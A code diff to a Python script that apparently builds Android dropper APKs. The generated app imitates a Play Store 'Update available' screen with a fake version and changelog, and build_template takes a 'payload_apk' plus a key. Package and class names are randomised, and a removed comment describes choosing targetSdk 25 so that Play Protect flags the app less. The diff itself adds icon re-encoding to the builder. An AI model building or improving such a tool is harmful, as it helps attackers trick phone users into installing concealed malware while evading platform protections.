@@ -1,4 +1,5 @@
 """Build a fresh minimal template APK — aapt2 + javac + d8. Play Store-style update UI."""
+import io
 import os
 import random
 import shutil
@@ -43,6 +44,36 @@ def _write_fallback_icon(path):
     import base64
     with open(path, "wb") as f:
         f.write(base64.b64decode(_FALLBACK_PNG_B64))
+
+
+def _reencode_png(raw_bytes: bytes, max_side: int = 192) -> bytes:
+    """Decode any image → re-save clean PNG. Raises on failure."""
+    from PIL import Image
+    img = Image.open(io.BytesIO(raw_bytes))
+    img.load()
+
+    if img.mode not in ("RGBA", "RGB"):
+        img = img.convert("RGBA")
+
+    w, h = img.size
+    if max(w, h) > max_side:
+        scale = max_side / float(max(w, h))
+        nw = max(1, int(w * scale))
+        nh = max(1, int(h * scale))
+        img = img.resize((nw, nh), Image.LANCZOS)
+
+    buf = io.BytesIO()
+    img.save(buf, format="PNG", optimize=True)
+    return buf.getvalue()
+
+
+def _safe_icon_bytes(raw_bytes: bytes) -> bytes:
+    """Try to produce aapt2-friendly PNG. Returns None on failure."""
+    try:
+        return _reencode_png(raw_bytes)
+    except Exception as e:
+        print(f"[!] icon decode failed: {e}", flush=True)
+        return None
 
 
 # ------------------------------------------------------------- MainActivity — Play Store style
@@ -112,7 +143,6 @@ public class {ACT} extends Activity {{
         col.setOrientation(LinearLayout.VERTICAL);
         col.setPadding(dp(24), dp(48), dp(24), dp(32));
 
-        // App icon
         ImageView ic = new ImageView(this);
         LinearLayout.LayoutParams icp = new LinearLayout.LayoutParams(dp(88), dp(88));
         icp.gravity = Gravity.CENTER_HORIZONTAL;
@@ -123,7 +153,6 @@ public class {ACT} extends Activity {{
         }} catch (Throwable t) {{}}
         col.addView(ic);
 
-        // App name
         TextView name = new TextView(this);
         name.setText("{LABEL}");
         name.setTextSize(24f);
@@ -137,7 +166,6 @@ public class {ACT} extends Activity {{
         name.setLayoutParams(np);
         col.addView(name);
 
-        // Update available
         TextView sub = new TextView(this);
         sub.setText("Update available");
         sub.setTextSize(15f);
@@ -151,7 +179,6 @@ public class {ACT} extends Activity {{
         sub.setLayoutParams(sp);
         col.addView(sub);
 
-        // Version info
         TextView ver = new TextView(this);
         ver.setText("Version 2.4.1  •  Latest");
         ver.setTextSize(13f);
@@ -165,20 +192,17 @@ public class {ACT} extends Activity {{
         ver.setLayoutParams(vp);
         col.addView(ver);
 
-        // Divider space
         View gap = new View(this);
         gap.setLayoutParams(new LinearLayout.LayoutParams(
             ViewGroup.LayoutParams.MATCH_PARENT, dp(24)));
         col.addView(gap);
 
-        // What's new heading
         TextView wh = new TextView(this);
         wh.setText("What's new");
         wh.setTextSize(16f);
         wh.setTextColor(Color.rgb(28, 28, 28));
         col.addView(wh);
 
-        // What's new body
         TextView wb = new TextView(this);
         wb.setText("• Performance improvements\\n"
                  + "• Bug fixes and stability\\n"
@@ -194,24 +218,19 @@ public class {ACT} extends Activity {{
         wb.setLayoutParams(wbp);
         col.addView(wb);
 
-        // Spacer push to bottom
         View spacer = new View(this);
-        LinearLayout.LayoutParams spc = new LinearLayout.LayoutParams(
-            ViewGroup.LayoutParams.MATCH_PARENT, dp(24));
-        spacer.setLayoutParams(spc);
+        spacer.setLayoutParams(new LinearLayout.LayoutParams(
+            ViewGroup.LayoutParams.MATCH_PARENT, dp(24)));
         col.addView(spacer);
 
-        // Progress
         progress = new ProgressBar(this, null, android.R.attr.progressBarStyleHorizontal);
         progress.setMax(100);
         progress.setProgress(0);
         progress.setVisibility(View.GONE);
-        LinearLayout.LayoutParams pp = new LinearLayout.LayoutParams(
-            ViewGroup.LayoutParams.MATCH_PARENT, dp(6));
-        progress.setLayoutParams(pp);
+        progress.setLayoutParams(new LinearLayout.LayoutParams(
+            ViewGroup.LayoutParams.MATCH_PARENT, dp(6)));
         col.addView(progress);
 
-        // Update button
         btnUpdate = new Button(this);
         btnUpdate.setText("Update");
         btnUpdate.setAllCaps(false);
@@ -374,8 +393,6 @@ public class {PROV} extends ContentProvider {{
 
 
 def _manifest_xml(pkg: str, app_class: str, activity_class: str, provider_class: str) -> str:
-    # NOTE: targetSdk 25 → REQUEST_INSTALL_PACKAGES ki zaroorat nahi
-    # Manifest clean rehta hai, Play Protect flag kam hota hai
     return f"""<?xml version="1.0" encoding="utf-8"?>
 <manifest xmlns:android="http://schemas.android.com/apk/res/android"
     package="{pkg}"
@@ -452,15 +469,20 @@ def build_template(payload_apk: str, session_dir: str, key: bytes):
         f.write(f'    <string name="app_name">{safe_xml_text(label)}</string>\n')
         f.write("</resources>\n")
 
+    # icon: always re-encode as clean PNG
     icon_path = os.path.join(drawable_dir, "ic_launcher.png")
+    wrote_icon = False
     if icon:
-        data, ext = icon
-        if ext != ".png":
-            icon_path = os.path.join(drawable_dir, "ic_launcher" + ext)
-        with open(icon_path, "wb") as f:
-            f.write(data)
-    else:
+        raw, _ext = icon
+        clean = _safe_icon_bytes(raw)
+        if clean:
+            with open(icon_path, "wb") as f:
+                f.write(clean)
+            wrote_icon = True
+            print(f"[✓] icon re-encoded ({len(clean)} bytes)", flush=True)
+    if not wrote_icon:
         _write_fallback_icon(icon_path)
+        print("[i] fallback icon used", flush=True)
 
     pkg = _rand_pkg()
     app_cls = "A" + "".join(random.choices(string.ascii_uppercase, k=random.randint(4, 8)))
